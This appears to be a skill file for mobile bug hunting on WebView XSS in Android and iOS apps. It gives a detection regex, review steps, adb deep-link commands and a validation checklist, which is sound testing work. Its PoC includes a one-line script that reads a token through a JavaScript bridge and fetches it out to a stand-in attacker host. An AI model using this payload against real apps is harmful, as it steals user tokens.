---
name: mhunt-webview-xss
description: Mobile hunting skill for webview xss on Android/iOS apps. Ported from droid-llm-hunter vuln_rule 'webview_xss'. MASVS-PLATFORM-2 (WebView XSS Protection). Use when /hunt-mobile (via mhunt-dispatch) fires this rule's detection_pattern, or when hunting webview xss in a decompiled app.
source: droid-llm-hunter (config/prompts/vuln_rules/webview_xss.yaml)
masvs: MASVS-PLATFORM-2
---

# mhunt-webview-xss

port of droid-llm-hunter's `webview_xss` vuln_rule into the `/hunt-mobile` model. **WebView XSS** — WebView with JavaScript enabled loads untrusted content via `loadUrl`/`loadData`, letting injected script run in-app and reach any JS bridge.

## MASVS

`MASVS-PLATFORM-2` — WebView XSS Protection. likely severity: **Medium** (confirm via the Gate-0 below; mobile severity depends on reachability + impact, not the pattern alone).

## Detection signal (the rule's `detection_pattern`)

android (smali/java/xml) — grep verbatim:

```
setJavaScriptEnabled\(true\)|addJavascriptInterface
```

ios parallel: `WKWebView`/`UIWebView` with `evaluateJavaScript:` or a `WKScriptMessageHandler` bridge loading attacker-controllable URLs/HTML

a regex hit is a **lead, not a finding** — droid-llm-hunter then deep-scans it with the LLM. that deep-scan is the methodology below.

## Static methodology (deep scan)

- Confirm `setJavaScriptEnabled(true)`, then find what `loadUrl`/`loadData`/`loadDataWithBaseURL` receives — if any part is attacker-controlled (deep-link param, Intent extra, server response over HTTP), it is XSS-reachable.
- Worse if combined with `addJavascriptInterface` — XSS then calls native methods (see `mhunt-insecure-webview`).
- Check `shouldOverrideUrlLoading` / `shouldInterceptRequest` for missing host allow-listing.

## Dynamic confirmation

- Launch the WebView activity with a hostile URL via deep link: `adb shell am start -a android.intent.action.VIEW -d 'https://attacker/xss.html' com.target/.WebActivity`.
- Serve a page with `<script>` that calls the exposed bridge or exfils; observe execution in the app context.

device prereqs: rooted Android emulator/device with `adb` + `frida-server` (and `drozer`/`objection` where noted), or a jailbroken iOS device with `frida`/`objection`. no device -> report as a static-only lead, don't claim confirmed.

## PoC

```bash
adb shell am start -n com.target/.WebViewActivity \
  --es url 'https://attacker.example/poc.html'
# poc.html: <script>AndroidBridge.getToken && fetch('//attacker/?t='+AndroidBridge.getToken())</script>
```

## Validation — MASVS Gate-0

before writing the report, answer all three:

1. **Reachability** — can an *external* actor trigger this (another app, a deep link, a network response, a shared file), or only the app itself? app-internal-only is usually not a finding.
2. **Impact** — what does the attacker gain (data read/write, code execution, auth bypass, privilege gain) and which CIA property does the victim lose? map to `MASVS-PLATFORM-2`.
3. **Reproducible in 10 min** — exact entry point (component/URI/intent) + payload + observed result (leaked data / state change / execution), on a clean install, no pre-seeded state.

if any answer is weak, it's a static lead — keep hunting, don't file.

## Chains

XSS + `addJavascriptInterface` -> native method invocation (RCE-ish); XSS + `setAllowUniversalAccessFromFileURLs` -> local file/cookie theft (`mhunt-webview-file-access`).
